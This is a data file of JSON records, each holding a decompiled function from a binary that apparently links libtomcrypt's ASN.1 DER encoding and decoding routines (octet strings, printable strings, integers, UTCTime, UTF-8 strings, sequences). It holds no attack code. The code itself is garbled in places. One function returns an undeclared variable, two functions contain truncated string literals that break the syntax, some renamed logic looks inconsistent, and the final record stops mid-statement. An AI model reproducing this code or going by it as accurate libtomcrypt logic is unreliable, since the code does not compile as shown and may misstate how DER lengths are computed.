{"Function Name": "FUN_00417000", "Address": "00417000", "Source Code": "undefined8 FUN_00417000(long input_pointer, ulong length, undefined *output_buffer, ulong *output_length_pointer)\n{\n    undefined temp_value; \n    long output_length; \n    ulong intermediate_results[2]; \n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x5017); \n    }\n    \n    if (output_buffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x5018); \n    }\n    \n    if (output_length_pointer == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5019); \n    }\n    \n    \n    if ((int)FUN_00416f50(length, intermediate_results) != 0) {\n        return uVar2; \n    }\n    \n    \n    if (*output_length_pointer < intermediate_results[0]) {\n        *output_length_pointer = intermediate_results[0]; \n        return 6; \n    }\n    \n    *output_buffer = 4; \n    temp_value = (undefined)length; \n    \n    \n    if (length < 0x80) {\n        output_buffer[1] = temp_value; \n        output_length = 2; \n    } else if (length < 0x100) {\n        output_buffer[1] = 0x81; \n        output_buffer[2] = temp_value; \n        output_length = 3; \n    } else {\n        if (length < 0x10000) {\n            output_buffer[1] = 0x82; \n            output_buffer[2] = (undefined)(length >> 8); \n            output_buffer[3] = temp_value; \n            output_length = 4; \n        } else {\n            if (0xffffff < length) {\n                return 0x10; \n            }\n            output_buffer[1] = 0x83; \n            output_buffer[2] = (char)(length >> 0x10); \n            output_buffer[3] = (undefined)(length >> 8); \n            output_buffer[4] = temp_value; \n            output_length = 5; \n        }\n    }\n    \n    \n    for (ulong index = 0; index < length; index++) {\n        output_buffer[index + output_length] = *(undefined *)(input_pointer + index); \n    }\n    \n    *output_length_pointer = length + output_length; \n    return 0; \n}"}
{"Function Name": "FUN_00417220", "Address": "00417220", "Source Code": "undefined8 FUN_00417220(byte *input_bytes, ulong input_length, long *output_length)\n{\n    byte *end_pointer;\n    \n    if (output_length == (long *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5746);\n    }\n    \n    if (input_bytes == (byte *)0x0) {\n        FUN_00410bc0(\"octets != NULL\", \"libtomcrypt.c\", 0x5747);\n    }\n    \n    if (input_length != 0) {\n        end_pointer = input_bytes + input_length; \n        do {\n            long index = 0; \n            \n            while ((uint)*input_bytes != L\"  \\'\\'(())++,,--..\n                index++; \n                \n                if (index == 0x4a) {\n                    return 0x10; \n                }\n            }\n            \n            if (L\"  \\'\\'(())++,,--..\n                return 0x10; \n            }\n            input_bytes++; \n        } while (input_bytes != end_pointer); \n        \n        \n        if (0x7f < input_length) {\n            if (input_length < 0x100) {\n                *output_length = input_length + 3; \n                return 0;\n            }\n            if (input_length < 0x10000) {\n                *output_length = input_length + 4; \n                return 0;\n            }\n            if (input_length < 0x1000000) {\n                *output_length = input_length + 5; \n                return 0;\n            }\n            return 0x10; \n        }\n    }\n    *output_length = input_length + 2; \n    return 0; \n}"}
{"Function Name": "FUN_00417330", "Address": "00417330", "Source Code": "undefined8 FUN_00417330(long input_ptr, ulong input_length, undefined *output_buffer, ulong *output_length_ptr)\n{\n    undefined single_byte_value; \n    ulong output_length; \n    ulong loop_counter; \n    ulong temporary_values[2]; \n    \n    if (input_ptr == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x506c); \n    }\n    \n    if (output_buffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x506d); \n    }\n    \n    if (output_length_ptr == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x506e); \n    }\n    \n    \n    undefined8 result_code = FUN_00417220(input_ptr, input_length, temporary_values);\n    \n    if ((int)result_code != 0) {\n        return result_code; \n    }\n    \n    if (*output_length_ptr < temporary_values[0]) {\n        *output_length_ptr = temporary_values[0]; \n        return 6; \n    }\n    \n    *output_buffer = 0x13; \n    \n    if (input_length < 0x80) {\n        output_buffer[1] = (undefined)input_length; \n        output_length = 2; \n    } else if (input_length < 0x100) {\n        output_buffer[1] = 0x81; \n        output_buffer[2] = (undefined)input_length; \n        output_length = 3; \n    } else {\n        \n        if (input_length < 0x10000) {\n            output_buffer[1] = 0x82; \n            output_buffer[2] = (undefined)(input_length >> 8); \n            output_buffer[3] = (undefined)input_length; \n            output_length = 4; \n        } else {\n            \n            if (0xffffff < input_length) {\n                return 0x10; \n            }\n            output_buffer[1] = 0x83; \n            output_buffer[2] = (char)(input_length >> 0x10); \n            output_buffer[3] = (undefined)(input_length >> 8); \n            output_buffer[4] = (undefined)input_length; \n            output_length = 5; \n        }\n    }\n    \n    loop_counter = 0; \n    \n    while (loop_counter != input_length) {\n        \n        output_buffer[loop_counter + output_length] = (undefined)(*(byte *)(input_ptr + loop_counter) == \n            L\"  \\'\\'(())++,,--..\n        loop_counter++; \n    }\n    \n    output_length += loop_counter; \n    *output_length_ptr = output_length; \n    return 0; \n}"}
{"Function Name": "FUN_004174f0", "Address": "004174f0", "Source Code": "undefined8 FUN_004174f0(uint input_value,long *output_pointer)\n{\n    \n    if (output_pointer == (long *)0x0) {\n        \n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x5830);\n    }\n    \n    \n    ulong unsigned_long_value = (ulong)input_value;\n    \n    byte bit_shift_value = 7;\n    long length_value = 3;\n    \n    if (unsigned_long_value != 0) {\n        long byte_count = 0; \n        \n        while (unsigned_long_value != 0) {\n            unsigned_long_value >>= 8; \n            byte_count++; \n        }\n        \n        if (byte_count != 0) {\n            length_value = byte_count + 3; \n            bit_shift_value = (char)byte_count * '\\b' - 1; \n        }\n    }\n    \n    *output_pointer = (ulong)(input_value >> (bit_shift_value & 0x3f) & 1) + length_value;\n    \n    return 0;\n}"}
{"Function Name": "FUN_00417710", "Address": "00417710", "Source Code": "undefined8 FUN_00417710(long utc_time, undefined8 *output_length)\n{\n    \n    if (output_length == (undefined8 *)0x0) {\n        \n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x5874);\n    }\n    \n    \n    if (utc_time == 0) {\n        \n        FUN_00410bc0(\"utctime != NULL\", \"libtomcrypt.c\", 0x5875);\n    }\n    \n    \n    *output_length = (*(int *)(utc_time + 0x1c) == 0 && *(int *)(utc_time + 0x20) == 0) ? 0xf : 0x13;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_00417f30", "Address": "00417f30", "Source Code": "undefined8 FUN_00417f30(uint *input_array,long input_length,long *output_length)\n{\n    \n    if (input_array == (uint *)0x0) {\n        \n        FUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x58b5);\n    }\n    \n    \n    if (output_length == (long *)0x0) {\n        \n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x58b6);\n    }\n    \n    \n    if (input_length == 0) {\n        \n        *output_length = 2;\n        return 0; \n    }\n    \n    ulong accumulated_length = 0; \n    long processed_count = 0;  \n    uint current_element = *input_array; \n    \n    while (current_element < 0x110000) {\n        \n        long current_length = (0x7f < (int)current_element) ? (0x7ff < (int)current_element) ? ((0xffff < (int)current_element) + 3) : 2 : 1;\n        accumulated_length += current_length; \n        \n        if (processed_count + 1 == input_length) {\n            \n            if (accumulated_length < 0x80) {\n                *output_length = accumulated_length + 2; \n            } else if (accumulated_length < 0x10000) {\n                *output_length = accumulated_length + 4; \n            } else if (accumulated_length < 0xffffff) {\n                *output_length = accumulated_length + 5; \n            } else {\n                return 0x10; \n            }\n            return 0; \n        }\n        processed_count++; \n        current_element = input_array[processed_count]; \n    }\n    return 0x10; \n}"}
{"Function Name": "FUN_00418070", "Address": "00418070", "Source Code": "undefined8 FUN_00418070(int *param_1,long param_2,long *param_3)\n{\n    int currentState; \n    undefined8 returnValue; \n    undefined8 *arrayPointer; \n    ulong accumulatedCount; \n    long temporaryLength; \n    \n    if (param_1 == (int *)0x0) {\n        FUN_00410bc0(\"list != NULL\",\"libtomcrypt.c\",0x578a); \n    }\n    \n    if (param_3 == (long *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x578b); \n    }\n    \n    if (param_2 != 0) {\n        currentState = *param_1; \n        returnValue = *(undefined8 *)(param_1 + 4); \n        arrayPointer = *(undefined8 **)(param_1 + 2); \n        accumulatedCount = 0; \n        temporaryLength = 0; \n        do {\n            \n            switch(currentState) {\n                case 1:\n                    accumulatedCount += 3; \n                    break;\n                case 2:\n                    returnValue = FUN_00416600(arrayPointer,&temporaryLength); \n                    currentState = (int)returnValue; \n                    if (currentState != 0) return returnValue; \n                    break;\n                case 3:\n                    returnValue = FUN_004174f0(*arrayPointer,&temporaryLength); \n                    currentState = (int)returnValue; \n                    if (currentState != 0) return returnValue; \n                    break;\n                case 4:\n                    returnValue = FUN_00415fc0(returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 5:\n                    returnValue = FUN_00416f50(returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 6:\n                    accumulatedCount += 2; \n                    break;\n                case 7:\n                    returnValue = FUN_00416ae0(arrayPointer,returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 8:\n                    returnValue = FUN_00416330(arrayPointer,returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 9:\n                    returnValue = FUN_00417220(arrayPointer,returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 10:\n                    returnValue = FUN_00417f30(arrayPointer,returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 0xb:\n                    returnValue = FUN_00417710(arrayPointer,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                case 0xd:\n                case 0xe:\n                case 0xf:\n                    returnValue = FUN_00418070(arrayPointer,returnValue,&temporaryLength); \n                    currentState = (int)returnValue; \n                    break;\n                default:\n                    return 0x10; \n            }\n            accumulatedCount += temporaryLength; \n            temporaryLength++; \n            if (temporaryLength == param_2) break; \n            currentState = param_1[0x10]; \n            returnValue = *(undefined8 *)(param_1 + 0x14); \n            arrayPointer = *(undefined8 **)(param_1 + 0x12); \n            param_1 += 0x10; \n        } while (currentState != 0); \n        \n        \n        if (accumulatedCount < 0x80) {\n            temporaryLength = accumulatedCount + 2; \n        } else if (accumulatedCount < 0x100) {\n            temporaryLength = accumulatedCount + 3; \n        } else if (accumulatedCount < 0x10000) {\n            temporaryLength = accumulatedCount + 4; \n        } else {\n            if (0xffffff < accumulatedCount) {\n                return 0x10; \n            }\n            temporaryLength = accumulatedCount + 5; \n        }\n        *param_3 = temporaryLength; \n        return 0; \n    }\n    *param_3 = 2; \n    return 0; \n}"}
{"Function Name": "FUN_00418300", "Address": "00418300", "Source Code": "\nundefined8 FUN_00418300(long param_1, ulong *param_2, long param_3, ulong param_4)\n{\n    int returnValue; // Variable to store return values from function calls\n    long loopIndex; // Variable for loop index\n    undefined8 functionResult; // Variable to store results from function calls\n    undefined4 *elementPointer; // Pointer to access elements in the list\n    ulong elementCounter; // Loop counter for processing elements\n    ulong temporaryResults[2]; // Local array to store temporary results\n\n    // Check if param_1 is NULL, log error if true\n    if (param_1 == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x470d);\n    }\n    // Check if param_2 is NULL, log error if true\n    if (param_2 == (ulong *)0x0) {\n        FUN_00410bc0(\"inlen != NULL\", \"libtomcrypt.c\", 0x470e);\n    }\n    // Check if param_3 is zero, log error if true\n    if (param_3 == 0) {\n        FUN_00410bc0(\"list != NULL\", \"libtomcrypt.c\", 0x470f);\n    }\n    // Proceed if the first element of param_2 is greater than 1 and param_4 is not zero\n    if ((1 < *param_2) && (param_4 != 0)) {\n        loopIndex = 0; // Initialize loop index\n        // Zero out memory in the specified range\n        do {\n            *(undefined4 *)(param_3 + 0x18 + loopIndex) = 0; // Set memory to zero\n            loopIndex += 0x40; // Increment index by 64 bytes\n        } while (loopIndex != param_4 << 6); // Continue until the specified range is covered\n        elementCounter = 0; // Initialize loop counter\n        // Loop through the elements in the list\n        do {\n            elementPointer = (undefined4 *)(elementCounter * 0x40 + param_3); // Get pointer to current element\n            switch (*elementPointer) { // Switch based on the value of the current element\n                default:\n                    return 0x10; // Return error code for unknown type\n                case 2:\n                    // Call function for type 2 and check return value\n                    returnValue = FUN_00414e20(param_1, *param_2, *(undefined8 *)(elementPointer + 2));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00416600(*(undefined8 *)(elementPointer + 2), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 3:\n                    // Call function for type 3 and check return value\n                    returnValue = FUN_004154a0(param_1, *param_2, *(undefined8 *)(elementPointer + 2));\n                    if (returnValue == 0) {\n                        functionResult = FUN_004174f0(*(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 4:\n                    // Call function for type 4 and check return value\n                    returnValue = FUN_00414a30(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00415fc0(*(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 5:\n                    // Call function for type 5 and check return value\n                    returnValue = FUN_00415180(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00416f50(*(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 6:\n                    // Special case for type 6\n                    if (((*param_2 == 2) && (*(char *)(param_1 + elementCounter) == '\\x05')) &&\n                        (*(char *)(param_1 + 1 + elementCounter) == '\\0')) {\n                        elementPointer[6] = 1; // Set a flag in the current element\n                        return 0; // Return success\n                    }\n                    break;\n                case 7:\n                    // Call function for type 7 and check return value\n                    returnValue = FUN_00414fb0(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00416ae0(*(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 8:\n                    // Call function for type 8 and check return value\n                    returnValue = FUN_00414c70(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00416330(*(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 9:\n                    // Call function for type 9 and check return value\n                    returnValue = FUN_004152f0(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00417220(*(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 10:\n                    // Call function for type 10 and check return value\n                    returnValue = FUN_004159d0(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4));\n                    if (returnValue == 0) {\n                        functionResult = FUN_00417f30(*(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n                    break;\n                case 0xb:\n                    // Handle type 11\n                    temporaryResults[0] = *param_2; // Store current value in local array\n                    functionResult = FUN_00415560(param_1, temporaryResults, *(undefined8 *)(elementPointer + 2)); // Call another function\n                    returnValue = (int)functionResult; // Store result\njoined_r0x004186c4:\n                    // Check if the function call was successful\n                    if (returnValue == 0) {\n                        elementPointer[6] = 1; // Set a flag in the current element\n                        *param_2 = temporaryResults[0]; // Update the value in param_2\n                        return functionResult; // Return the result\n                    }\n                    break;\n                case 0xd:\n                case 0xe:\n                case 0xf:\n                    // Handle types 13, 14, and 15\n                    returnValue = FUN_00418740(param_1, *param_2, *(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4), 1); // Call another function\n                    if (returnValue == 0) {\n                        functionResult = FUN_00418070(*(undefined8 *)(elementPointer + 2), *(undefined8 *)(elementPointer + 4), temporaryResults); // Call another function\n                        returnValue = (int)functionResult; // Store result\n                        goto joined_r0x004186c4; // Jump to common exit point\n                    }\n            }\n            elementCounter++; // Increment loop counter\n        } while (elementCounter < param_4); // Continue until all elements are processed\n    }\n    return 7; // Return error code if no conditions were met\n}\n"}
{"Function Name": "FUN_00418740", "Address": "00418740", "Source Code": "undefined8 FUN_00418740(char *param_1,ulong param_2,long param_3,ulong param_4,int param_5)\n{\nbyte bVar1;\nundefined8 *puVar2;\nint iVar3;\nlong lVar4;\nulong uVar5;\nundefined8 uVar7;\nulong uVar8;\nint *piVar9;\nulong uVar10;\nundefined8 local_48;\nulong local_40 [2];\nulong uVar6;\nif (param_1 == (char *)0x0) {\nFUN_00410bc0(\"in != NULL\",\"libtomcrypt.c\",0x49b3);\n}\nif (param_3 == 0) {\nFUN_00410bc0(\"list != NULL\",\"libtomcrypt.c\",0x49b4);\n}\nif (param_2 < 2) {\nreturn 7;\n}\nif (1 < (byte)(*param_1 - 0x30U)) {\nreturn 7;\n}\nbVar1 = param_1[1];\nuVar8 = (ulong)bVar1;\nuVar10 = 2;\nif ((char)bVar1 < '\\0') {\nif (2 < (byte)(bVar1 + 0x7f)) {\nreturn 7;\n}\nuVar10 = (ulong)(bVar1 & 0x7f) + 2;\nif (param_2 < uVar10) {\nreturn 7;\n}\nuVar8 = 0;\nif ((ulong)(bVar1 & 0x7f) == 0) {\nuVar10 = 2;\ngoto LAB_004187b5;\n}\nuVar6 = 2;\ndo {\nuVar5 = uVar6 + 1;\nuVar8 = (ulong)(byte)param_1[uVar6] | uVar8 << 8;\nuVar6 = uVar5;\n} while (uVar10 != uVar5);\n}\nif (param_2 < uVar8 + uVar10) {\nreturn 7;\n}\nLAB_004187b5:\nif (param_4 == 0) {\nreturn 0;\n}\nlVar4 = 0;\ndo {\n*(undefined4 *)(param_3 + 0x18 + lVar4) = 0;\nlVar4 = lVar4 + 0x40;\n} while (lVar4 != param_4 << 6);\nuVar6 = 0;\ndo {\npiVar9 = (int *)(uVar6 * 0x40 + param_3);\nlocal_48 = *(undefined8 *)(piVar9 + 4);\niVar3 = *piVar9;\npuVar2 = *(undefined8 **)(piVar9 + 2);\nif ((param_5 == 0) && (piVar9[6] == 1)) goto LAB_004188c9;\nif (iVar3 == 0) break;\nlocal_40[0] = uVar8;\nswitch(iVar3) {\ncase 1:\nuVar7 = FUN_00414bd0(param_1 + uVar10,uVar8,puVar2);\nif ((int)uVar7 != 0) {\nreturn uVar7;\n}\nlocal_40[0] = 3;\ngoto LAB_00418970;\ncase 2:\nuVar7 = FUN_00414e20(param_1 + uVar10,uVar8,puVar2);\nif ((int)uVar7 == 0) {\nuVar7 = FUN_00416600(puVar2,local_40);\niVar3 = (int)uVar7;\nbreak;\n}\ngoto LAB_004188c0;\ncase 3:\nuVar7 = FUN_004154a0(param_1 + uVar10,uVar8,puVar2);\nif ((int)uVar7 != 0) goto LAB_004188c0;\nuVar7 = FUN_004174f0(*puVar2,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 4:\nuVar7 = FUN_00414a30(param_1 + uVar10,uVar8,puVar2,&local_48);\nif ((int)uVar7 != 0) goto LAB_004188c0;\n*(undefined8 *)(piVar9 + 4) = local_48;\nuVar7 = FUN_00415fc0(local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 5:\nuVar7 = FUN_00415180(param_1 + uVar10,uVar8,puVar2,&local_48);\nif ((int)uVar7 != 0) goto LAB_004188c0;\n*(undefined8 *)(piVar9 + 4) = local_48;\nuVar7 = FUN_00416f50(local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 6:\nif (((uVar8 < 2) || (param_1[uVar10] != '\\x05')) || (param_1[uVar10 + 1] != '\\0')) {\nif (param_5 != 0) {\nreturn 7;\n}\ngoto LAB_004188c9;\n}\nlocal_40[0] = 2;\ngoto LAB_00418970;\ncase 7:\nuVar7 = FUN_00414fb0(param_1 + uVar10,uVar8,puVar2,&local_48);\nif ((int)uVar7 != 0) goto LAB_004188c0;\n*(undefined8 *)(piVar9 + 4) = local_48;\nuVar7 = FUN_00416ae0(puVar2,local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 8:\nuVar7 = FUN_00414c70(param_1 + uVar10,uVar8,puVar2,&local_48);\nif ((int)uVar7 != 0) goto LAB_004188c0;\n*(undefined8 *)(piVar9 + 4) = local_48;\nuVar7 = FUN_00416330(puVar2,local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 9:\nuVar7 = FUN_004152f0(param_1 + uVar10,uVar8,puVar2,&local_48);\nif ((int)uVar7 != 0) goto LAB_004188c0;\n*(undefined8 *)(piVar9 + 4) = local_48;\nuVar7 = FUN_00417220(puVar2,local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 10:\nuVar7 = FUN_004159d0(param_1 + uVar10,uVar8,puVar2,&local_48);\nif ((int)uVar7 != 0) goto LAB_004188c0;\n*(undefined8 *)(piVar9 + 4) = local_48;\nuVar7 = FUN_00417f30(puVar2,local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\ncase 0xb:\nuVar7 = FUN_00415560(param_1 + uVar10,local_40,puVar2);\niVar3 = (int)uVar7;\ngoto joined_r0x00418965;\ncase 0xc:\nuVar7 = FUN_00418300(param_1 + uVar10,local_40,puVar2);\niVar3 = (int)uVar7;\njoined_r0x00418965:\nif (iVar3 == 0) goto LAB_00418970;\nLAB_004188c0:\nif (param_5 != 0) {\nreturn uVar7;\n}\nLAB_004188c9:\nuVar6 = uVar6 + 1;\ngoto LAB_004188cd;\ncase 0xd:\ncase 0xf:\nif (iVar3 == 0xf) {\nif ((param_1[uVar10] & 0x3fU) != 0x31) {\nreturn 7;\n}\n}\nelse if ((iVar3 == 0xd) && ((param_1[uVar10] & 0x3fU) != 0x30)) {\nreturn 7;\n}\nuVar7 = 1;\ngoto LAB_0041888a;\ncase 0xe:\nuVar7 = 0;\nLAB_0041888a:\nuVar7 = FUN_00418740(param_1 + uVar10,uVar8,puVar2,local_48,uVar7);\nif ((int)uVar7 == 0) {\nuVar7 = FUN_00418070(puVar2,local_48,local_40);\niVar3 = (int)uVar7;\nbreak;\n}\ngoto LAB_004188c0;\ndefault:\nreturn 0x10;\n}\nif (iVar3 != 0) {\nreturn uVar7;\n}\nLAB_00418970:\nuVar10 = uVar10 + local_40[0];\nuVar8 = uVar8 - local_40[0];\nuVar5 = uVar6 + 1;\npiVar9[6] = 1;\nuVar6 = 0;\nif (param_5 != 0) {\nuVar6 = uVar5;\n}\nLAB_004188cd:\n} while (uVar6 < param_4);\nif (*(int *)(param_3 + 0x18) != 0) {\nuVar10 = 0;\ndo {\nuVar10 = uVar10 + 1;\nif (uVar10 == param_4) {\nreturn 0;\n}\npiVar9 = (int *)(param_3 + 0x58);\nparam_3 = param_3 + 0x40;\n} while (*piVar9 != 0);\n}\nreturn 7;\n}\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8"}
{"Function Name": "FUN_00419040", "Address": "00419040", "Source Code": "undefined8 FUN_00419040(int *param_1,long param_2,char *param_3,ulong *param_4,int param_5)\n{\nchar cVar1;\nint iVar2;\nundefined8 uVar3;\nulong uVar4;\nint *piVar5;\nundefined8 *puVar6;\nlong lVar7;\nchar cVar8;\nulong uVar9;\nulong local_48;\nulong local_40 [2];\nif (param_1 == (int *)0x0) {\nFUN_00410bc0(\"list != NULL\",\"libtomcrypt.c\",0x50c5);\n}\nif (param_3 == (char *)0x0) {\nFUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x50c6);\n}\nif (param_4 == (ulong *)0x0) {\nFUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x50c7);\n}\nif (param_2 != 0) {\niVar2 = *param_1;\nuVar3 = *(undefined8 *)(param_1 + 4);\npuVar6 = *(undefined8 **)(param_1 + 2);\nif (iVar2 != 0) {\nlVar7 = 0;\nuVar9 = 0;\npiVar5 = param_1;\ndo {\nswitch(iVar2) {\ncase 1:\nlocal_48 = 3;\nuVar9 = uVar9 + 3;\ngoto LAB_004190dd;\ncase 2:\nuVar3 = FUN_00416600(puVar6,&local_48);\niVar2 = (int)uVar3;\ngoto joined_r0x0041924f;\ncase 3:\nuVar3 = FUN_004174f0(*puVar6,&local_48);\niVar2 = (int)uVar3;\njoined_r0x0041924f:\nif (iVar2 != 0) {\nreturn uVar3;\n}\ngoto LAB_004190d8;\ncase 4:\nuVar3 = FUN_00415fc0(uVar3,&local_48);\niVar2 = (int)uVar3;\nbreak;\ncase 5:\nuVar3 = FUN_00416f50(uVar3,&local_48);\niVar2 = (int)uVar3;\nbreak;\ncase 6:\nuVar9 = uVar9 + 2;\ngoto LAB_004190dd;\ncase 7:\nuVar3 = FUN_00416ae0(puVar6,uVar3,&local_48);\niVar2 = (int)uVar3;\nbreak;\ncase 8:\nuVar3 = FUN_00416330(puVar6,uVar3,&local_48);\niVar2 = (int)uVar3;\nbreak;\ncase 9:\nuVar3 = FUN_00417220(puVar6,uVar3,&local_48);\niVar2 = (int)uVar3;\nbreak;\ncase 10:\nuVar3 = FUN_00417f30(puVar6,uVar3,&local_48);\niVar2 = (int)uVar3;\nbreak;\ncase 0xb:\nuVar3 = FUN_00417710(puVar6,&local_48);\niVar2 = (int)uVar3;\nbreak;\ndefault:\ngoto switchD_004190b1_caseD_c;\ncase 0xd:\ncase 0xe:\ncase 0xf:\nuVar3 = FUN_00418070(puVar6,uVar3,&local_48);\niVar2 = (int)uVar3;\n}\nif (iVar2 != 0) {\nreturn uVar3;\n}\nLAB_004190d8:\nuVar9 = uVar9 + local_48;\nLAB_004190dd:\nlVar7 = lVar7 + 1;\nif (lVar7 == param_2) break;\niVar2 = piVar5[0x10];\nuVar3 = *(undefined8 *)(piVar5 + 0x14);\npuVar6 = *(undefined8 **)(piVar5 + 0x12);\npiVar5 = piVar5 + 0x10;\n} while (iVar2 != 0);\nif (uVar9 < 0x80) {\nuVar4 = uVar9 + 2;\n}\nelse {\nuVar4 = uVar9 + 3;\nif ((0xff < uVar9) && (uVar4 = uVar9 + 4, 0xffff < uVar9)) {\nif (0xffffff < uVar9) {\nreturn 0x10;\n}\nuVar4 = uVar9 + 5;\n}\n}\ngoto LAB_004192b4;\n}\n}\nuVar4 = 2;\nuVar9 = 0;\nLAB_004192b4:\nif (*param_4 < uVar4) {\n*param_4 = uVar4;\nreturn 6;\n}\nlocal_48 = 1;\n*param_3 = (param_5 != 0xd) + '0';\ncVar8 = (char)uVar9;\nif (uVar9 < 0x80) {\nlocal_48 = 2;\nparam_3[1] = cVar8;\nuVar4 = 2;\n}\nelse if (uVar9 < 0x100) {\nlocal_48 = 3;\nuVar4 = 3;\nparam_3[1] = -0x7f;\nparam_3[2] = cVar8;\n}\nelse {\ncVar1 = (char)(uVar9 >> 8);\nif (uVar9 < 0x10000) {\nlocal_48 = 4;\nuVar4 = 4;\nparam_3[1] = -0x7e;\nparam_3[2] = cVar1;\nparam_3[3] = cVar8;\n}\nelse {\nuVar4 = 1;\nif (uVar9 < 0x1000000) {\nlocal_48 = 5;\nuVar4 = 5;\nparam_3[2] = (char)(uVar9 >> 0x10);\nparam_3[1] = -0x7d;\nparam_3[4] = cVar8;\nparam_3[3] = cVar1;\n}\n}\n}\n*param_4 = *param_4 - uVar4;\nif (param_2 != 0) {\niVar2 = *param_1;\nuVar3 = *(undefined8 *)(param_1 + 4);\npuVar6 = *(undefined8 **)(param_1 + 2);\nif (iVar2 != 0) {\nlVar7 = 0;\ndo {\nswitch(iVar2) {\ncase 1:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00415c10(*(undefined4 *)puVar6,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 2:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00416730(puVar6,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\ngoto joined_r0x00419601;\ncase 3:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00417580(*puVar6,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\njoined_r0x00419601:\nif (iVar2 != 0) {\nreturn uVar3;\n}\ngoto LAB_004193d0;\ncase 4:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00416080(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 5:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00417000(puVar6,uVar3,param_3 + local_48,local_40);\niVar2 = (int)uVar3;\nbreak;\ncase 6:\nparam_3[local_48] = '\\x05';\nparam_3[local_48 + 1] = '\\0';\n*param_4 = *param_4 - 2;\nlocal_48 = local_48 + 2;\ngoto LAB_004193de;\ncase 7:\nlocal_40[0] = *param_4;\nuVar3 = FUN_00416c60(puVar6,uVar3,param_3 + 